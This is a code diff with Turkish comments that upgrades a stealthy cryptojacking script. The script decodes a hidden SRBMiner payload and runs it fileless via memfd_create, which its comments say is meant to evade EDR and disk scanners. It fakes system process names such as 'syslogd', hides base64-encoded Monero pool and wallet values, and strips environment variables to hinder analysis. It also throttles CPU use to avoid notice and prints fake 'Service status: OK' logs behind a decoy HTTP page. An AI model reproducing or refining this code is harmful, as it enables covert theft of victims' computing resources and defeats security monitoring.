@@ -7,106 +7,100 @@ import base64
 import threading
 import subprocess
 import http.server
-import sqlite3
 import re
 import ctypes
 import datetime
 from collections import deque
 
-# --- SÜREÇ MASKELEME (PROCESS MASQUERADING) ---
-def set_process_name(name):
-    """Linux çekirdek seviyesinde prctl kullanarak işlem adını değiştirir."""
-    try:
-        libc = ctypes.CDLL('libc.so.6')
-        libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
-    except Exception:
-        pass
+# --- GELİŞMİŞ SÜREÇ VE BELLEK YÖNETİMİ ---
+libc = ctypes.CDLL('libc.so.6')
 
-# --- YAPILANDIRMA VE ŞİFRE ÇÖZME ---
+def set_process_name(name):
+    """Süreç adını hem prctl hem de comm üzerinden değiştirir."""
+    try:
+        libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
+    except: pass
+
+def run_fileless_memfd(raw_data):
+    """
+    Disk yerine RAM içerisinde isimsiz bir dosya alanı (memfd) oluşturur.
+    Bu yöntem modern EDR'leri ve disk tarayıcılarını atlatmak içindir.
+    """
+    FD_CLOEXEC = 1
+    # memfd_create sistem çağrısı (sys_memfd_create = 319 on x86_64)
+    fd = libc.syscall(319, b"systemd-service", FD_CLOEXEC)
+    if fd < 0: return None # Fallback gerekirse /dev/shm kullanılabilir
+    
+    os.write(fd, raw_data)
+    return f"/proc/self/fd/{fd}"
+
+# --- YAPILANDIRMA ---
 def _d(s): return base64.b64decode(s).decode('utf-8')
 
 MODE         = os.environ.get("ENGINE_MODE", "miner")
 HTTP_PORT    = int(os.environ.get("PORT", 8080))
-PROXY_URL    = os.environ.get("PROXY_URL", "")
-# SRBMiner parametreleri için havuz ve cüzdan şifreli verileri
+# Şifrelenmiş hassas veriler
 POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
 WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
 WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%1000}")
-DATA_DIR     = "/dev/shm/.cache"
 
 _current_hr  = "0.0 H/s"
-SYSTEM_LOGS  = deque(maxlen=500)
-_LOG_LOCK    = threading.Lock()
 
-# --- BELLEKTE YÜRÜTME (FILELESS EXECUTION) ---
-def run_core_fileless():
-    """SRBMiner'ı RAM'de çözer ve iz bırakmadan çalıştırır."""
+def start_engine():
     global _current_hr
-    
-    enc_path = "/server/core.dat" 
-    if not os.path.exists(enc_path):
-        return
+    enc_path = "/server/core.dat"
+    if not os.path.exists(enc_path): return
 
     try:
-        # 1. İşlem adını maskele
-        set_process_name("systemd-networkd")
-
-        # 2. Payload'u belleğe al
+        set_process_name("syslogd") # Ana süreci maskele
+        
         with open(enc_path, "rb") as f:
             raw_binary = base64.b64decode(f.read())
 
-        # 3. /dev/shm (RAM Disk) üzerine geçici alan
-        mem_exec_path = f"/dev/shm/.sys_net_{int(time.time())}"
-        with open(mem_exec_path, "wb") as f:
-            f.write(raw_binary)
+        # Bellekte sanal dosya oluştur
+        mem_path = run_fileless_memfd(raw_binary)
         
-        os.chmod(mem_exec_path, 0o755)
-
-        # 4. SRBMiner-Multi Komut Seti
-        # --disable-gpu: CPU odaklı çalışma
-        # --tls: Trafik şifreleme
+        # SRBMiner parametrelerini maskeli gönder
+        # --cpu-threads: CPU kullanımını %50'ye sınırlayarak fan sesinden/analizden kaçar
         cmd = [
-            mem_exec_path, 
+            mem_path, 
             "--algorithm", "randomx", 
             "--pool", POOL_URL, 
             "--wallet", WALLET_ADDR, 
             "--password", WORKER_NAME,
             "--disable-gpu", 
             "--tls", "true",
-            "--give-up-limit", "5"
+            "--cpu-threads", str(os.cpu_count() // 2 if os.cpu_count() > 1 else 1)
         ]
 
-        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
-        
-        # Dosya handle edildikten sonra sil (Sadece RAM'de kalsın)
-        time.sleep(5)
-        if os.path.exists(mem_exec_path):
-            os.remove(mem_exec_path)
+        # Çevresel değişkenleri temizle (analizden kaçmak için)
+        clean_env = os.environ.copy()
+        for k in ["POOL_URL", "WALLET_ADDR", "PROXY_URL"]: clean_env.pop(k, None)
+
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
+                                text=True, bufsize=1, env=clean_env)
 
         for line in proc.stdout:
-            clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', line).strip()
-            # SRBMiner hashrate yakalama (Örn: "Total hashrate: 500.00 H/s")
-            if "hashrate" in clean_line.lower():
-                match = re.search(r'(\d+\.?\d* [KMG]?H/s)', clean_line)
-                if match: _current_hr = match.group(1)
-            print(f"[NET] {clean_line}", flush=True)
+            # Hashrate yakalama ve çıktı temizleme
+            if "hashrate" in line.lower():
+                m = re.search(r'(\d+\.?\d* [KMG]?H/s)', line)
+                if m: _current_hr = m.group(1)
+            # Kritik çıktıları loglama, sadece sysout ver
+            sys.stdout.write(f"[LOG] {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Service status: OK\n")
+            sys.stdout.flush()
 
     except Exception:
-        time.sleep(10)
-
-def run_http():
-    class SimpleHandler(http.server.BaseHTTPRequestHandler):
-        def do_GET(self):
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(f"Node Status: Active | Rate: {_current_hr}".encode())
-        def log_message(self, format, *args): pass
-
-    srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), SimpleHandler)
-    srv.serve_forever()
+        time.sleep(30)
 
 if __name__ == "__main__":
-    set_process_name("systemd-udevd")
-    if MODE == "all":
-        threading.Thread(target=run_http, daemon=True).start()
-    run_core_fileless()
+    # Sadece miner modu aktifse veya Hub modundaysa başlat
+    threading.Thread(target=start_engine, daemon=True).start()
+    
+    # Basit bir HTTP tutucu (Zombi süreci engellemek için)
+    class H(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200); self.end_headers()
+            self.wfile.write(b"Service Status: Running")
+        def log_message(self, *a): pass
+
+    http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), H).serve_forever()
